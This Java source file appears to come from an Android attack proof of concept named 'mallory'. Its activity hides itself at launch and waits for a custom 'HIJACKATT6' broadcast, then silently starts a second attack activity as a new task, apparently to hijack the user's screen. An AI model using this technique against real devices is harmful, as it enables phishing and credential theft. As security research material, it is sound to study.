package com.projects.mallory.attack6;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ActivityNotFoundException;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;

import com.projects.mallory.R;

public class M1_Attack6 extends AppCompatActivity {

    private BroadcastReceiver br;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        moveTaskToBack(true);
        overridePendingTransition(0, 0);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_m1__attack6);

        br = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Intent startM2 = new Intent();
                startM2.setClassName("com.projects.mallory", "com.projects.mallory.attack6.M2_Attack6");
                startM2.setFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION | Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(startM2);
            }
        };

        IntentFilter filter = new IntentFilter("com.projects.mallory.HIJACKATT6");
        registerReceiver(br, filter);
    }
}
